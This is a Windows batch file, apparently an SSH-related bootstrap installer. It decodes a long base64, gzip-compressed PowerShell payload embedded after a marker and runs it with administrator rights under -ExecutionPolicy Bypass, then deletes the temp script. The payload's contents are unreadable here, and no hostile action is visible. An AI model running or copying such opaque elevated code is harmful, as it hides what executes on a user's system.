@echo off
setlocal
set "BOOTSTRAP_BUNDLE_FILE=%~f0"

rem Check policy and elevation before extracting or running the embedded PowerShell payload.
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $policy=Get-ExecutionPolicy -List; $policy | Format-Table -AutoSize; if (@($policy | Where-Object { $_.Scope -in @('MachinePolicy','UserPolicy') -and $_.ExecutionPolicy -ne 'Undefined' }).Count -gt 0) { Write-Error 'Execution policy is enforced by Group Policy. Ask the device administrator; no bypass was attempted.'; exit 3 }; $identity=[Security.Principal.WindowsIdentity]::GetCurrent(); $principal=[Security.Principal.WindowsPrincipal]::new($identity); if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Error 'Open Command Prompt as Administrator and run this file again.'; exit 2 }; $raw=[IO.File]::ReadAllText($env:BOOTSTRAP_BUNDLE_FILE,[Text.Encoding]::ASCII); $marker='::BEGIN_PS_PAYLOAD::'; $index=$raw.IndexOf($marker); if ($index -lt 0) { Write-Error 'Embedded bootstrap payload was not found.'; exit 4 }; $payload=$raw.Substring($index+$marker.Length).Trim(); $bytes=[Convert]::FromBase64String($payload); $inputStream=[IO.MemoryStream]::new($bytes); $gzip=[IO.Compression.GzipStream]::new($inputStream,[IO.Compression.CompressionMode]::Decompress); $reader=[IO.StreamReader]::new($gzip,[Text.Encoding]::UTF8); $source=$reader.ReadToEnd(); $temp=Join-Path $env:TEMP ('bootstrap-ssh-'+[guid]::NewGuid().ToString('N')+'.ps1'); $code=1; try { [IO.File]::WriteAllText($temp,$source,[Text.UTF8Encoding]::new($false)); & powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File $temp; $code=$LASTEXITCODE } finally { if (Test-Path -LiteralPath $temp) { Remove-Item -LiteralPath $temp -Force } }; exit $code"
set "RC=%ERRORLEVEL%"
exit /b %RC%

::BEGIN_PS_PAYLOAD::
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
xCj+TIC/Xvnj8m7rVwNbBfSGg1n5soSn/Aok87lgsS3GKFzCMqsNAvaQXouNGvJaMKCKw68nkdIb
mVW4o87yF7gFndICxy3320DEzER9j2/qi9PN7mG4X9U9TK4o7psliFHasGt1xxQ3zVyI4L7DTkQw
B0ChLlHoXjI4iq9uShk4qTDZYqdqEM2KgTpNl5lxkCCbRkM0DfL1KOMdtCYCYC2zMA1smpHojZxO
bdU9YPcKxz7Yb+KFCEYXjdVQ/AanPwA/UMOhlAOs/EKfGmlSy8T05AtnpVF9uLJGnDn2FHpSfhYf
qDvgdPWp4UT1FpoQjD7rlzxyVT54wjvBq7MSLVWf8qrepE7AvdmX3RaZSa+vYV1rb3IE2PiNxqM5
gLO1GYPRLcHsfCig49CnzS+aGanSej+Jyug1QAqqOfBbpq411ODftbDueQjr78S6DXyDYa50gBgz
F1mi8Uq3dv9V9qx8m3lm3njEXpzGgoWDPxYDXjB2DaJ68l+d6DZfC7fzs87axW1DSyokQosbeDnT
6MrMnuKt/CyhKhACbAxZNvBap5xu6zfsaLXMftqqfFtrpfEWfv4XBj5deykHDPRXGiyMIVpAT4Zx
hs8FyggSMCz8RXAembDba43csBKj25Wl5fSqmPUNG8uQyq6JMSyiemy4VpetIVGqWLvircfyzXoq
5/FVUMW1lsrB4LoyN223KrdihmyD/0GnQEG1V1FZW/1ZDVOBeViN0CaS43jD34iwQq3FX4ZQR1pq
3qkayRFmAoig+o4488KA49/HgMUEsxVF+yFaGvvhRqncziA3//jyB5+jKdpB8iPdvsHr1Vbr/654
GHdeNAAA
